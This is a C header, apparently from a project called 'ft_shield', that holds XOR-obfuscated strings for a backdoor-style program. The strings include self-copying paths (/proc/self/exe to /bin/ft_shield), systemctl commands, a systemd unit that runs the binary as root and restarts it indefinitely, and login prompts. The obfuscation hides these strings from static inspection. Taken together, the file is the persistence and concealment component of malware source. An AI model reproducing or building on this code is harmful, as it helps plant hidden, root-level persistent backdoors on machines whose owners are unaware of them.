#ifndef CONSTANTS_H
#define CONSTANTS_H

#include "shield.h"
#include <stdint.h>

typedef enum ObfuscatedStringTableIndex {
    PROC_SELF_EXE,
    BIN_FT_SHIELD,
    SYSTEMCTL_DAEMON_RELOAD,
    SYSTEMCTL_START_FT_SHIELD,
    SYSTEMCTL_STOP_FT_SHIELD,
    SYSTEMD_CONFIG,
    SYSTEMD_CONFIG_PATH,
    INVALID_PASSWORD_TRY_AGAIN,
    LOGIN_SUCCESSFUL,
} ObfuscatedStringTableIndex;

static uint8_t proc_self_exe[] = {
    '/' ^ 0x42, 'p' ^ 0x42, 'r' ^ 0x42, 'o' ^ 0x42, 'c' ^ 0x42, '/' ^ 0x42, 's' ^ 0x42, 'e' ^ 0x42,
    'l' ^ 0x42, 'f' ^ 0x42, '/' ^ 0x42, 'e' ^ 0x42, 'x' ^ 0x42, 'e' ^ 0x42, 0x0,
};

static uint8_t bin_ft_shield[] = {
    '/' ^ 0x42, 'b' ^ 0x42, 'i' ^ 0x42, 'n' ^ 0x42, '/' ^ 0x42, 'f' ^ 0x42, 't' ^ 0x42, '_' ^ 0x42,
    's' ^ 0x42, 'h' ^ 0x42, 'i' ^ 0x42, 'e' ^ 0x42, 'l' ^ 0x42, 'd' ^ 0x42, 0x0,
};

static uint8_t systemctl_daemon_reload[] = {
    's' ^ 0x42, 'y' ^ 0x42, 's' ^ 0x42, 't' ^ 0x42, 'e' ^ 0x42, 'm' ^ 0x42, 'c' ^ 0x42, 't' ^ 0x42, 'l' ^ 0x42, ' ' ^ 0x42, 'd' ^ 0x42, 'a' ^ 0x42,
    'e' ^ 0x42, 'm' ^ 0x42, 'o' ^ 0x42, 'n' ^ 0x42, '-' ^ 0x42, 'r' ^ 0x42, 'e' ^ 0x42, 'l' ^ 0x42, 'o' ^ 0x42, 'a' ^ 0x42, 'd' ^ 0x42, 0x0,
};

static uint8_t systemctl_start_ft_shield[] = {
    's' ^ 0x42, 'y' ^ 0x42, 's' ^ 0x42, 't' ^ 0x42, 'e' ^ 0x42, 'm' ^ 0x42, 'c' ^ 0x42, 't' ^ 0x42, 'l' ^ 0x42, ' ' ^ 0x42, 's' ^ 0x42, 't' ^ 0x42, 'a' ^ 0x42,
    'r' ^ 0x42, 't' ^ 0x42, ' ' ^ 0x42, 'f' ^ 0x42, 't' ^ 0x42, '_' ^ 0x42, 's' ^ 0x42, 'h' ^ 0x42, 'i' ^ 0x42, 'e' ^ 0x42, 'l' ^ 0x42, 'd' ^ 0x42, 0x0,
};

static uint8_t systemctl_stop_ft_shield[] = {
    's' ^ 0x42, 'y' ^ 0x42, 's' ^ 0x42, 't' ^ 0x42, 'e' ^ 0x42, 'm' ^ 0x42, 'c' ^ 0x42, 't' ^ 0x42, 'l' ^ 0x42, ' ' ^ 0x42, 's' ^ 0x42, 't' ^ 0x42, 'o' ^ 0x42,
    'p' ^ 0x42, ' ' ^ 0x42, 'f' ^ 0x42, 't' ^ 0x42, '_' ^ 0x42, 's' ^ 0x42, 'h' ^ 0x42, 'i' ^ 0x42, 'e' ^ 0x42, 'l' ^ 0x42, 'd' ^ 0x42, 0x0,
};

static uint8_t systemd_config[] = {
    '[' ^ 0x42, 'U' ^ 0x42, 'n' ^ 0x42,  'i' ^ 0x42,  't' ^ 0x42,  ']' ^ 0x42,  '\n' ^ 0x42, 'D' ^ 0x42,  'e' ^ 0x42,  's' ^ 0x42,  'c' ^ 0x42,  'r' ^ 0x42,
    'i' ^ 0x42, 'p' ^ 0x42, 't' ^ 0x42,  'i' ^ 0x42,  'o' ^ 0x42,  'n' ^ 0x42,  '=' ^ 0x42,  'N' ^ 0x42,  'o' ^ 0x42,  'n' ^ 0x42,  'e' ^ 0x42,  ' ' ^ 0x42,
    'o' ^ 0x42, 'f' ^ 0x42, ' ' ^ 0x42,  'y' ^ 0x42,  'o' ^ 0x42,  'u' ^ 0x42,  'r' ^ 0x42,  ' ' ^ 0x42,  'b' ^ 0x42,  'u' ^ 0x42,  's' ^ 0x42,  'i' ^ 0x42,
    'n' ^ 0x42, 'e' ^ 0x42, 's' ^ 0x42,  's' ^ 0x42,  ' ' ^ 0x42,  'G' ^ 0x42,  '\n' ^ 0x42, 'A' ^ 0x42,  'f' ^ 0x42,  't' ^ 0x42,  'e' ^ 0x42,  'r' ^ 0x42,
    '=' ^ 0x42, 'n' ^ 0x42, 'e' ^ 0x42,  't' ^ 0x42,  'w' ^ 0x42,  'o' ^ 0x42,  'r' ^ 0x42,  'k' ^ 0x42,  '.' ^ 0x42,  't' ^ 0x42,  'a' ^ 0x42,  'r' ^ 0x42,
    'g' ^ 0x42, 'e' ^ 0x42, 't' ^ 0x42,  '\n' ^ 0x42, 'S' ^ 0x42,  't' ^ 0x42,  'a' ^ 0x42,  'r' ^ 0x42,  't' ^ 0x42,  'L' ^ 0x42,  'i' ^ 0x42,  'm' ^ 0x42,
    'i' ^ 0x42, 't' ^ 0x42, 'I' ^ 0x42,  'n' ^ 0x42,  't' ^ 0x42,  'e' ^ 0x42,  'r' ^ 0x42,  'v' ^ 0x42,  'a' ^ 0x42,  'l' ^ 0x42,  'S' ^ 0x42,  'e' ^ 0x42,
    'c' ^ 0x42, '=' ^ 0x42, '0' ^ 0x42,  '\n' ^ 0x42, '\n' ^ 0x42, '[' ^ 0x42,  'S' ^ 0x42,  'e' ^ 0x42,  'r' ^ 0x42,  'v' ^ 0x42,  'i' ^ 0x42,  'c' ^ 0x42,
    'e' ^ 0x42, ']' ^ 0x42, '\n' ^ 0x42, 'T' ^ 0x42,  'y' ^ 0x42,  'p' ^ 0x42,  'e' ^ 0x42,  '=' ^ 0x42,  's' ^ 0x42,  'i' ^ 0x42,  'm' ^ 0x42,  'p' ^ 0x42,
    'l' ^ 0x42, 'e' ^ 0x42, '\n' ^ 0x42, 'R' ^ 0x42,  'e' ^ 0x42,  's' ^ 0x42,  't' ^ 0x42,  'a' ^ 0x42,  'r' ^ 0x42,  't' ^ 0x42,  '=' ^ 0x42,  'a' ^ 0x42,
    'l' ^ 0x42, 'w' ^ 0x42, 'a' ^ 0x42,  'y' ^ 0x42,  's' ^ 0x42,  '\n' ^ 0x42, 'R' ^ 0x42,  'e' ^ 0x42,  's' ^ 0x42,  't' ^ 0x42,  'a' ^ 0x42,  'r' ^ 0x42,
    't' ^ 0x42, 'S' ^ 0x42, 'e' ^ 0x42,  'c' ^ 0x42,  '=' ^ 0x42,  '1' ^ 0x42,  '\n' ^ 0x42, 'U' ^ 0x42,  's' ^ 0x42,  'e' ^ 0x42,  'r' ^ 0x42,  '=' ^ 0x42,
    'r' ^ 0x42, 'o' ^ 0x42, 'o' ^ 0x42,  't' ^ 0x42,  '\n' ^ 0x42, 'E' ^ 0x42,  'x' ^ 0x42,  'e' ^ 0x42,  'c' ^ 0x42,  'S' ^ 0x42,  't' ^ 0x42,  'a' ^ 0x42,
    'r' ^ 0x42, 't' ^ 0x42, '=' ^ 0x42,  '/' ^ 0x42,  'b' ^ 0x42,  'i' ^ 0x42,  'n' ^ 0x42,  '/' ^ 0x42,  'f' ^ 0x42,  't' ^ 0x42,  '_' ^ 0x42,  's' ^ 0x42,
    'h' ^ 0x42, 'i' ^ 0x42, 'e' ^ 0x42,  'l' ^ 0x42,  'd' ^ 0x42,  ' ' ^ 0x42,  '%' ^ 0x42,  's' ^ 0x42,  '\n' ^ 0x42, '\n' ^ 0x42, '[' ^ 0x42,  'I' ^ 0x42,
    'n' ^ 0x42, 's' ^ 0x42, 't' ^ 0x42,  'a' ^ 0x42,  'l' ^ 0x42,  'l' ^ 0x42,  ']' ^ 0x42,  '\n' ^ 0x42, 'W' ^ 0x42,  'a' ^ 0x42,  'n' ^ 0x42,  't' ^ 0x42,
    'e' ^ 0x42, 'd' ^ 0x42, 'B' ^ 0x42,  'y' ^ 0x42,  '=' ^ 0x42,  'm' ^ 0x42,  'u' ^ 0x42,  'l' ^ 0x42,  't' ^ 0x42,  'i' ^ 0x42,  '-' ^ 0x42,  'u' ^ 0x42,
    's' ^ 0x42, 'e' ^ 0x42, 'r' ^ 0x42,  '.' ^ 0x42,  't' ^ 0x42,  'a' ^ 0x42,  'r' ^ 0x42,  'g' ^ 0x42,  'e' ^ 0x42,  't' ^ 0x42,  '\n' ^ 0x42, 0x0,
};

static uint8_t systemd_config_path[] = {'/' ^ 0x42, 'e' ^ 0x42, 't' ^ 0x42, 'c' ^ 0x42, '/' ^ 0x42, 's' ^ 0x42, 'y' ^ 0x42, 's' ^ 0x42, 't' ^ 0x42, 'e' ^ 0x42,
                                        'm' ^ 0x42, 'd' ^ 0x42, '/' ^ 0x42, 's' ^ 0x42, 'y' ^ 0x42, 's' ^ 0x42, 't' ^ 0x42, 'e' ^ 0x42, 'm' ^ 0x42, '/' ^ 0x42,
                                        'f' ^ 0x42, 't' ^ 0x42, '_' ^ 0x42, 's' ^ 0x42, 'h' ^ 0x42, 'i' ^ 0x42, 'e' ^ 0x42, 'l' ^ 0x42, 'd' ^ 0x42, '.' ^ 0x42,
                                        's' ^ 0x42, 'e' ^ 0x42, 'r' ^ 0x42, 'v' ^ 0x42, 'i' ^ 0x42, 'c' ^ 0x42, 'e' ^ 0x42, 0x0};

static uint8_t invalid_password_try_again[] = {'I' ^ 0x42, 'n' ^ 0x42, 'v' ^ 0x42, 'a' ^ 0x42,  'l' ^ 0x42, 'i' ^ 0x42, 'd' ^ 0x42, ' ' ^ 0x42,
                                               'p' ^ 0x42, 'a' ^ 0x42, 's' ^ 0x42, 's' ^ 0x42,  'w' ^ 0x42, 'o' ^ 0x42, 'r' ^ 0x42, 'd' ^ 0x42,
                                               ',' ^ 0x42, ' ' ^ 0x42, 't' ^ 0x42, 'r' ^ 0x42,  'y' ^ 0x42, ' ' ^ 0x42, 'a' ^ 0x42, 'g' ^ 0x42,
                                               'a' ^ 0x42, 'i' ^ 0x42, 'n' ^ 0x42, '\n' ^ 0x42, 0x00};

static uint8_t login_successful[] = {'L' ^ 0x42, 'o' ^ 0x42, 'g' ^ 0x42, 'i' ^ 0x42, 'n' ^ 0x42, ' ' ^ 0x42, 's' ^ 0x42, 'u' ^ 0x42,  'c' ^ 0x42,
                                     'c' ^ 0x42, 'e' ^ 0x42, 's' ^ 0x42, 's' ^ 0x42, 'f' ^ 0x42, 'u' ^ 0x42, 'l' ^ 0x42, '\n' ^ 0x42, 0x00};

static ObfuscatedStringTableEntry strings[] = {
    {.data = (uint8_t *)proc_self_exe,              .len = sizeof(proc_self_exe),              .decoded = false},
    {.data = (uint8_t *)bin_ft_shield,              .len = sizeof(bin_ft_shield),              .decoded = false},
    {.data = (uint8_t *)systemctl_daemon_reload,    .len = sizeof(systemctl_daemon_reload),    .decoded = false},
    {.data = (uint8_t *)systemctl_start_ft_shield,  .len = sizeof(systemctl_start_ft_shield),  .decoded = false},
    {.data = (uint8_t *)systemctl_stop_ft_shield,   .len = sizeof(systemctl_stop_ft_shield),   .decoded = false},
    {.data = (uint8_t *)systemd_config,             .len = sizeof(systemd_config),             .decoded = false},
    {.data = (uint8_t *)systemd_config_path,        .len = sizeof(systemd_config_path),        .decoded = false},
    {.data = (uint8_t *)invalid_password_try_again, .len = sizeof(invalid_password_try_again), .decoded = false},
    {.data = (uint8_t *)login_successful,           .len = sizeof(login_successful),           .decoded = false},
};

#endif
